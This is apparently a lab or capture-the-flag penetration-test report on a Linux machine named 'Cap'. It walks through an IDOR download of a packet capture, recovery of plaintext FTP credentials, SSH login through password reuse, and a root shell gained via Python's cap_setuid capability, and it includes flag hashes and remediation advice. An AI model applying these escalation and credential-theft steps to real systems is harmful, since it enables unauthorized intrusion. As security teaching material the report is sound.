# Cap - Vulnerability Assessment Report

**Author:** Dan Schvetz  
**Date:** 04-06-2026  
**Target IP:** 10.129.12.178  
**OS:** Linux  
**Difficulty:** Easy  

---

## 1. Executive Summary

**Objective:** To perform a vulnerability assessment and network penetration test against the target machine "Cap" to identify security weaknesses and evaluate the overall risk to the environment.

**Outcome:** The machine was successfully compromised, resulting in full administrative (`root`) access. 

**Key Findings:** The initial compromise was achieved by exploiting an Insecure Direct Object Reference (IDOR) vulnerability within the web application, which exposed a sensitive network packet capture containing plaintext credentials. Privilege escalation was subsequently achieved by exploiting a misconfigured Linux Capability (`cap_setuid`) on the Python 3.8 binary.

| Risk Metric | Status |
| :--- | :--- |
| **Overall Risk Rating** | **High** |
| **Initial Access Vector** | IDOR / Credential Disclosure |
| **Privilege Escalation** | Linux Capability Misconfiguration |

---

## 2. Methodology & Scope

* **Scope:** 10.129.12.178
* **Methodology:**
    1.  Information Gathering & Enumeration
    2.  Vulnerability Analysis
    3.  Exploitation (Initial Access)
    4.  Post-Exploitation & Privilege Escalation
    5.  Reporting & Remediation

---

## 3. Attack Narrative (Technical Walkthrough)

### 3.1 Reconnaissance & Enumeration
*Initial network scanning and service identification.*

**Port Scanning:**
An initial TCP port scan was conducted to identify active services on the target host.

```text
nmap -sC -sV -A -Pn -p- --min-rate 1000 10.129.12.178

Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-06-04 04:16 -0400
Nmap scan report for 10.129.12.178
Host is up (0.062s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
```
*Figure 1: Nmap scan identifies open ports: 21 (FTP), 22 (SSH), and 80 (HTTP).*

**Verified Controls (Negative Findings):**
* Attempted an anonymous login against the vsftpd 3.0.3 service on port 21. The server correctly denied the unauthenticated request (`530 Login incorrect`), confirming that anonymous FTP access is disabled.

**Web Application Enumeration:**
Navigation to the web service on port 80 revealed a "Security Dashboard." The application automatically redirects users to a data endpoint (e.g., `http://10.129.12.178/data/1`) which allows the downloading of network packet captures (`.pcap` files) associated with the current session.

### 3.2 Initial Access (Exploitation)
*Execution of the identified vulnerabilities to achieve a user-level foothold.*

**Vulnerability Discovery (IDOR):**
The web application utilizes sequential integers in the URL to reference packet capture files. By manually decrementing the identifier in the URL from `data/1` to `data/0`, the application failed to validate authorization and served a historical packet capture file belonging to a different session.

**Reproduction (Developer-Friendly Verification):**
The IDOR vulnerability can be reproduced directly via browser or `curl` by requesting the unauthorized index:
```bash
curl -O [http://10.129.12.178/data/0](http://10.129.12.178/data/0)
```

**Credential Disclosure:**
Analysis of the exposed `0.pcap` file using Wireshark revealed an unencrypted FTP session. Following the TCP stream exposed plaintext credentials for a local user.

```text
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
```
*Figure 2: Wireshark TCP Stream transcript exposing the credentials: `nathan` / `Buck3tH4TF0RM3!`.*

**Exploitation Step-by-Step:**
1.  Verified the credentials against the FTP service, confirming the account was active.
2.  Leveraged the same credentials against the SSH service (Port 22), exploiting a password reuse vulnerability.

```text
# ssh nathan@10.129.12.178
nathan@10.129.12.178's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

nathan@cap:~$ whoami
nathan
nathan@cap:~$ cat user.txt
095fbb9993319c0f874f832e41a514a6
```
*Figure 3: Successful SSH authentication as the user `nathan` and verification of initial access.*

### 3.3 Privilege Escalation
*Lateral movement and elevation to administrative access.*

**Internal Enumeration:**
After establishing a foothold, the `linpeas.sh` enumeration script was deployed to identify local privilege escalation vectors. While the script flagged several potential kernel vulnerabilities, the most reliable vector was an anomalous Linux capability assignment.

**The Flaw (Misconfigured Capabilities):**
Linux capabilities allow specific administrative privileges to be assigned to binaries without granting full `root` access (SUID). Enumeration revealed that the Python 3.8 binary was assigned the `cap_setuid` capability.

```text
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
*Figure 4: Identification of the `cap_setuid` capability on the Python binary.*

**Exploitation:**
Because Python possesses the `cap_setuid` capability, any user executing the binary can instruct the Python interpreter to arbitrarily change its User ID (UID) to 0 (`root`) and subsequently spawn an elevated system shell.

```text
nathan@cap:~$ /usr/bin/python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
root@cap:~# whoami
root
root@cap:~# cat /root/root.txt
25279440d7ad5a344c0c3c2c51ff6b9b
```
*Figure 5: Execution of the Python capability exploit yields a root shell.*

---

## 4. Vulnerability Details & Remediation

### Vulnerability 1: Insecure Direct Object Reference (IDOR) & Plaintext Protocol Usage
* **Severity:** High

**Description:**
The web application fails to implement proper authorization checks when users request resources (packet captures) via direct URL parameters (`/data/0`). This flaw allowed an attacker to download network traffic generated by other users or administrative processes. Furthermore, because internal administrative tasks were performed over an unencrypted protocol (FTP), sensitive credentials captured in the traffic were exposed in plaintext.

**Business Impact:**
An attacker can access highly sensitive historical network telemetry. In this instance, it directly led to the compromise of employee credentials, allowing the attacker to bypass external perimeter security entirely and access the internal system via SSH.

**Remediation:**
* **Implement Access Controls:** Ensure that the web application verifies that the user requesting a specific data object is explicitly authorized to view it, rather than relying solely on the URL parameter.
* **Deprecate Plaintext Protocols:** Disable FTP and enforce the use of secure, encrypted protocols (such as SFTP or SCP) for all file transfers and administrative tasks to prevent credential interception.

### Vulnerability 2: Insecure Linux Capability Assignment (`cap_setuid`)
* **Severity:** High

**Description:**
The `/usr/bin/python3.8` executable was assigned the `cap_setuid+ep` capability. The `cap_setuid` capability permits a process to make arbitrary manipulations of process UIDs. Because Python is a scripting language capable of executing OS-level commands, assigning this capability effectively grants full system `root` access to any local user who can execute Python.

**Business Impact:**
Any low-privileged local user, or an attacker who has compromised a low-level service account, can instantly escalate their privileges to `root`. This results in a total compromise of the host OS, allowing the attacker to alter system logs, install persistent malware, or pivot further into the internal network.

**Remediation:**
* **Remove Capability:** Immediately remove the `cap_setuid` and `cap_net_bind_service` capabilities from the Python binary using the `setcap` utility:
  ```bash
  sudo setcap -r /usr/bin/python3.8
  ```
* **Enforce Least Privilege:** If specific Python scripts require elevated privileges to run (such as binding to low ports), execute those specific scripts via `sudo` with strict, explicitly defined rules, rather than elevating the entire Python interpreter globally.